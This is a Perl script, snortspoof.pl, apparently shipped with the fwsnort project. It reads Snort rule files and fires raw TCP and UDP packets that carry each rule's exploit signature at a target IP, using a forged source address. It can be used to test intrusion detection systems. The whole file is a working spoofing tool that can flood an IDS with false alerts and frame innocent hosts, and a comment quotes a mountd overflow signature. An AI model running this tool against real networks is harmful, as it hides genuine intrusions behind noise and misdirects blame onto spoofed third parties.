#!/usr/bin/perl -w
#
###############################################################################
#
# File: snortspoof.pl
#
# Purpose: To parse rules from the Snort rule set and spoof them at a target
#          IP from arbitrary source addresses.  This is similar to the
#          technique employed by the Stick and Snot projects.  Snortspoof.pl
#          is distributed with the fwsnort project
#          (http://www.cipherdyne.org/fwsnort/).
#
# Author: Michael Rash <mbr@cipherdyne.org>
#
# Copyright (C) 2003-2007 Michael Rash (mbr@cipherdyne.org)
#
# License (GNU Public License):
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program; if not, write to the Free Software
#    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307
#    USA
#
###############################################################################
#

require Net::RawIP;
use strict;

my $file       = $ARGV[0] || '';
my $spoof_addr = $ARGV[1] || '';
my $dst_addr   = $ARGV[2] || '';

die "$0 <rules file> <spoof IP> <dst IP>"
    unless $file and $spoof_addr and $dst_addr;

# alert udp $EXTERNAL_NET any -> $HOME_NET 635 (msg:"EXPLOIT x86 Linux mountd
# overflow"; content:"^|B0 02 89 06 FE C8 89|F|04 B0 06 89|F";
# reference:bugtraq,121; reference:cve,1999-0002; classtype:attempted-admin;
# sid:315; rev:6;)
my $sig_sent = 0;
open F, "< $file" or die "[*] Could not open $file: $!";
SIG: while (<F>) {
    my $content = '';
    my $conv_content = '';
    my $hex_mode = 0;
    my $proto = '';
    my $spt = 10000;
    my $dpt = 10000;

    ### make sure it is an inbound sig
    if (/^\s*alert\s+(tcp|udp)\s+\S+\s+(\S+)\s+\S+
            \s+(\$HOME_NET|any)\s+(\S+)\s/x) {
        $proto = $1;
        my $spt_tmp = $2;
        my $dpt_tmp = $4;

        ### can't handle multiple content fields yet
        next SIG if /content:.*\s*content\:/;

        $content = $1 if /\s*content\:\"(.*?)\"\;/;
        next SIG unless $content;

        if ($spt_tmp =~ /(\d+)/) {
            $spt = $1;
        } elsif ($spt_tmp ne 'any') {
            next SIG;
        }
        if ($dpt_tmp =~ /(\d+)/) {
            $dpt = $1;
        } elsif ($dpt_tmp ne 'any') {
            next SIG;
        }

        my @chars = split //, $content;
        for (my $i=0; $i<=$#chars; $i++) {
            if ($chars[$i] eq '|') {
                $hex_mode == 0 ? ($hex_mode = 1) : ($hex_mode = 0);
                next;
            }
            if ($hex_mode) {
                next if $chars[$i] eq ' ';
                $conv_content .= sprintf("%c",
                        hex($chars[$i] . $chars[$i+1]));
                $i++;
            } else {
                $conv_content .= $chars[$i];
            }
        }
        my $rawpkt = '';
        if ($proto eq 'tcp') {
            $rawpkt = new Net::RawIP({'ip' => {
                saddr => $spoof_addr, daddr => $dst_addr},
                'tcp' => { source => $spt, dest => $dpt, 'ack' => 1,
                data => $conv_content}})
                    or die "[*] Could not get Net::RawIP object: $!";
        } else {
            $rawpkt = new Net::RawIP({'ip' => {
                saddr => $spoof_addr, daddr => $dst_addr},
                'udp' => { source => $spt, dest => $dpt,
                data => $conv_content}})
                    or die "[*] Could not get Net::RawIP object: $!";
        }
        $rawpkt->send();
        $sig_sent++;
    }
}
print "[+] $file, $sig_sent attacks sent.\n";
close F;
exit 0;
